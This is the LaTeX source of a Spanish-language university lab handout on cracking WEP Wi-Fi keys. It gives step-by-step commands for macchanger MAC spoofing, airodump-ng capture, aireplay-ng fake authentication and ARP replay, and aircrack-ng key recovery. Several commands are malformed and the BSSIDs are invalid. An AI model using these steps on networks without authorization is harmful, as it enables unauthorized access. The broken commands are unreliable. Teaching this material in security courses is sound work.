%%% LaTeX Template: Article/Thesis/etc. Including abstract
%%%
%%% Source: http://www.howtotex.com/
%%% Feel free to distribute this template, but please keep to referal to http://www.howtotex.com/ here.
%%% February 2011

%%%%% Preamble
\documentclass[11pt,a4paper]{scrartcl}			% KOMA scrartcl is called for several reasons:
																		%	Nicer page margins without the need of the 'geometry' package
																		
\usepackage[top=1.5cm,bottom=2.5cm,left=1.5cm,right=1.5cm,headsep=20pt,letterpaper]{geometry}
																		% 	Perfectly fitting abstract environment
																		% 	High customizability

%\usepackage[latin1]{inputenc}							% Input encoding
\usepackage[utf8]{inputenc}
\usepackage{amsmath,amsfonts,amssymb}	% Math packages
\usepackage{multicol}

%%%%% Definitions
%%% Define a new command that prints the title only
\makeatletter							% Begin definition
\def\printtitle{%						% Define command: \printauthor
    {\centering \huge \normalfont \textbf{\@title}\par}}		% Typesetting
\makeatother							% End definition

\title{Taller No.\ 2}

%%% Define a new command that prints the author(s) only
\makeatletter							% Begin definition
\def\printauthor{%					% Define command: \printtitle
    {\large \@author}}				% Typesetting
\makeatother							% End definition

\author{%
	Prof.: Kevin Moraga \\
	Seguridad en Redes inalámbricas y dispositivos móviles \\
	\texttt{kmoragas@gmail.com}\vspace{40pt} \\
	Universidad Cenfotec \\
	Especialidad en Seguridad \\
	\texttt{Junio 2015}
	}
	
\renewcommand{\abstractname}{Objetivo}

%%% Headers and footers
\usepackage{fancyhdr}												% Needed to define custom headers/footers
	\pagestyle{fancy}														% Enabling the custom headers/footers
\usepackage{lastpage}	

% Header (empty)
\lhead{}
\chead{}
\rhead{}
% Footer (you may change this to your own needs)
\lfoot{\footnotesize \texttt{Universidad Cenfotec} \textbullet ~Seguridad en Redes inalámbricas y dispositivos móviles}
\cfoot{}
\rfoot{\footnotesize page \thepage\ of \pageref{LastPage}}	% "Page 1 of 2"
\renewcommand{\headrulewidth}{0.0pt}
\renewcommand{\footrulewidth}{0.4pt}


%%% Change the 'KOMA' sectioning fonts back to standard LaTeX font (this is just a matter of taste)
\setkomafont{sectioning}{\rmfamily\bfseries\boldmath}


%%% Change the abstract environment
\usepackage[runin]{abstract}			% runin option for a run-in title
\setlength\absleftindent{10pt}		% left margin
\setlength\absrightindent{10pt}		% right margin
\abslabeldelim{\quad}						% 
\setlength{\abstitleskip}{-10pt}
\renewcommand{\abstracttextfont}{\small \slshape}	% slanted text


%%% Start of the document
\begin{document}


%%% Top of the page: Author, Title and Abstact
\begin{minipage}{0.35\linewidth}
	\begin{flushright}
		\printauthor
	\end{flushright}
\end{minipage} \hspace{0pt}
%
\begin{minipage}{0.02\linewidth}
	\rule{3pt}{175pt}
\end{minipage} \hspace{0pt}
%
\begin{minipage}{0.63\linewidth}
%\begin{flushleft}
\printtitle 
\vspace{5pt}
	\begin{abstract} 
Wireless Equivalent Privacy, o WEP como se le conoce comúnmente, ha estado presente desde 1999 y es el estándar de seguridad más antigua que se utilizó para proteger las redes inalámbricas. En 2003, fue reemplazado por WPA y posteriormente por WPA2. Debido a tener protocolos más seguros disponibles, cifrado WEP se utiliza muy poco. A pesar de ello es necesario entender los mecanismos que se utilizan para la penetración de la misma. 
\\

\textbf{Datos Generales}
\begin{itemize}
\item El valor del taller: 0\%.
\item Nombre del taller:  Taller de Seguridad Wireless
\end{itemize}
	\end{abstract}
%\end{flushleft}
\end{minipage}
\vspace{20pt}		% Add some vertical spacing to seperate the abstract from the rest of the article


\setlength{\columnsep}{0.5cm}
%\setlength{\columnseprule}{1pt}

%\twocolumn

\begin{multicols*}{2}

\section{Conexión a una red WEP}
\begin{enumerate}



\item Inicie con Kali linux y asegúrese que no hay ningún administrador de redes corriendo como: nm-applet o Knetwork

\item Verifique todas las interfaces que posee en su sistema.

\begin{verbatim}
root@kali:~# ifconfig -a
\end{verbatim}


\item Intente conectarse desde la terminal a una red abierta.

\begin{verbatim}
# iwconfig wlan0 mode Managed
# iwconfig wlan0 essid homenet
\end{verbatim}


\item Intente conectarse desde la terminal a una red protegida con contraseña.

\begin{verbatim}
# iwconfig wlan0 mode Managed
# iwconfig wlan0 key 967136deac
# iwconfig wlan0 essid homenet
\end{verbatim}

\end{enumerate}

%%% Start of the 'real' content of the article, using a two column layout
\section{Wireless WEP Cracking}

\subsection{Configuración inicial}

\begin{enumerate}

\item Abra una terminal y verifique la lista de interfaces de red

\begin{verbatim}
# airmon-ng
\end{verbatim}

\item Bajo la columna de intefaces seleccione una de sus interfaces. Por ejemplo \textit{wlan0}. 

\item Es necesario bajar y detener la intefaz \textit{wlan0}. Para así cambiar el maccaddres.

\begin{verbatim}
# airmon-ng stop ifconfig wlan0 down
\end{verbatim}

\item Ahora se debe de cambiar el MAC address de la interfaz. Es recomendable realizar esto para ocultar el verdadero valor de la MAC.

\begin{verbatim}
# macchanger --mac 00:11:22:33:44:55 wlan0
\end{verbatim}

\item Ahora se reinicia \textit{airmon-ng}.

\begin{verbatim}
# airmon-ng start wlan0
\end{verbatim}

\item Ahora utilice airodump para ubicar las redes wireless cercanas.


\begin{verbatim}
# airodump-ng wlan0
\end{verbatim}

\item Una lista de redes disponibles comenzará a aparecer. Una vez que encuentre el que quiere atacar, pulse Ctrl + C para detener la búsqueda. Resalte la dirección MAC en la columna BSSID. Además, tome nota del canal que la red está transmitiendo su señal sobre. Encontrará esta información en la columna de la Canal. A continuación se utilizará el canal número 10.

\item Ahora ejecutamos airodump y copiamos la información del BSSID seleccionado en un archivo. Vamos a utilizar las siguientes opciones:

\begin{itemize}
\item -c Nos permite seleccionar el canal. En este caso, utilizamos 10.
\item -w Nos permite seleccionar el nombre de nuestro archivo. En este caso, hemos elegido wirelessattack.
\item -bssid Nos permite seleccionar nuestra BSSID. En este caso, vamos a utilizar el valor previamente seleccionado: \textit{09:BC:90:00:78}.
\end{itemize}

\begin{verbatim}
# airodump-ng -c 10 -w wirelessattack \
	--bssid 09:BC:90:00:78 wlan0
\end{verbatim}

\item Deje esta terminal así. 

\end{enumerate}

\subsection{Iniciando el Ataque}

\begin{enumerate}


\item Abra otra terminal; para intentar hacer asociaciones, vamos a ejecutar aireplay en modo de ataque 1, el cual consiste en una "Autenticación Ficticia al Access Point" con un delay de 0. Estableciendo el AP con -a, el source MAC Address con -h y por último estableciendo el ESSID objetivo con la opción -e, la sintaxis completa es como sigue: aireplay-ng -1 0 -a [BSSID] -h [MAC address elegida] -e [ESSID] [Interface]. 

\begin{verbatim}
# aireplay-ng -1 0 -a 09:AC:90:AB:78 \
	-h 00:11:22:33:44:55 -e lab2 wlan0
\end{verbatim}

\item En otra terminal, vamos a enviar algo de tráfico al router para que tengamos algunos datos para capturar. Para ello enviaremos solicitudes ARP estándar utilizando el modo de ataque 3. En este caso la sintaxis de aireplay es:  aireplay-ng -3 -b [BSSID] -h [MAC address elegido] [Interface]

\begin{verbatim}
# aireplay-ng -3 -b 09:AC:90:AB:78 \
	-h 00:11:22:33:44:55 wlan0
\end{verbatim}

\item En la terminal se podrá ver tráfico. Esperemos al menos 1 o 2 minutos hasta que tengamos suficiente información para correr el crack. 

\item Finalmente volvemos a correr AirCrack para crackear la llave WEP.

\begin{verbatim}
# aircrack-ng -b 09:AC:90:AB:78 \
	wirelessattack.cap
\end{verbatim}

\end{enumerate}

\subsection{¿Cómo funciona?}

En los procedimientos anteriores, se utilizó la suite AirCrack para romper la clave WEP de una red inalámbrica. AirCrack es uno de los programas más populares para cracking WEP. AirCrack funciona mediante la recopilación de los paquetes de una conexión inalámbrica a través de WEP y luego analizar matemáticamente los datos de descifrar la clave WEP cifrado. Comenzamos el ataque iniciando AirCrack y seleccionando la interfaz deseada. A continuación, hemos cambiado nuestra dirección MAC que nos permitió cambiar nuestra identidad en la red y luego realizaron búsquedas en las redes inalámbricas disponibles para atacar usando airodump. Una vez que encontramos la red queríamos atacar, utilizamos aireplay asociar nuestra máquina con la dirección MAC del dispositivo inalámbrico atacábamos. Concluimos por reunir algo de tráfico y luego aplicarle fuerza bruta al archivo CAP generado con el fin de obtener la contraseña inalámbrica.

~\vfill

\end{multicols*}

\end{document}